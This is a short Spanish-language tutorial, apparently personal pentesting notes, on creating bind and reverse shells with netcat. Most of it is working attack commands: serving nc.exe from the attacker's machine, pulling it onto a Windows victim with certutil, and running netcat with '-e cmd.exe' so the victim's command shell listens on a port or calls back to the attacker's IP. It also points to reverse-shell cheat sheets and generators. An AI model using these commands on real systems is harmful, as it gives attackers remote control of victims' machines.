Una bind shell es cuando el atacante se conecta mediante netcat a un cliente netcat corriendo en un puerto en la máquina víctima. El principal problema de esto es que normalmente el firewall bloquea las conexiones entrantes por lo que es preferido por parte de los atacantes usar reverse_shells

NOTA: No es necesario usar netcat cliente para establecer una conexión con un netcat listener, se pueden usar otras aplicaciones como bash. En este repo tienes muchas formas de conectarte https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
Otro recurso donde se generar las rev shell ya con la ip y el lenguaje o binario que escojamos para establecer la conexión es: https://www.revshells.com


## Cómo crear una bind_shell

1. Si no tiene instalada la máquina víctima netcat por defecto, como en el caso de windows, debemos transferir el binario. Para ello, por ejemplo vamos a la ruta /usr/share/windows-binaries y creamos un servidor simple con python `python -m SimpleHTTPServer 80`. En la máquina víctima usamos `certutil -urlcache -f http://ipdelamaquinaatacante/nc.exe nc.exe`. Ya disponemos del binario en la máquina víctima.
2. Ahora nos ponemos por escucha en la máquina target mediante: `nc -nvlp 1234 -e cmd.exe` el parámetro -e es para ejecutar un programa en este caso un cmd por lo que las máquinas que se conecten obtendrán un cmd.
3. Nos ejecutamos desde la máquina atacante con nc cliente al nc servidor de la máquina target. `nc -nv <ipmaquinavictima> 1234`
4. Listo ya tenemos acceso mediante una bindshell.

### Cómo crear una reverse_shell

1. En la máquina atacante nos ponemos en escucha : `nc -nvlp 1234.
2. Si no tiene instalada la máquina víctima netcat por defecto, como en el caso de windows, debemos transferir el binario. Para ello, por ejemplo vamos a la ruta /usr/share/windows-binaries y creamos un servidor simple con python `python -m SimpleHTTPServer 80`. En la máquina víctima usamos `certutil -urlcache -f http://ipdelamaquinaatacante/nc.exe nc.exe`. Ya disponemos del binario en la máquina víctima.
3.  Nos conectamos a la máquina atacante desde la máquina víctima y ejecutamos un cmd.exe `nc -nv <ipatacante> 1234 -e cmd.exe`
4. Listo ya tenemos una reverse shell ya que la máquina target se conectó a nosotros y ejecutó un cmd.exe

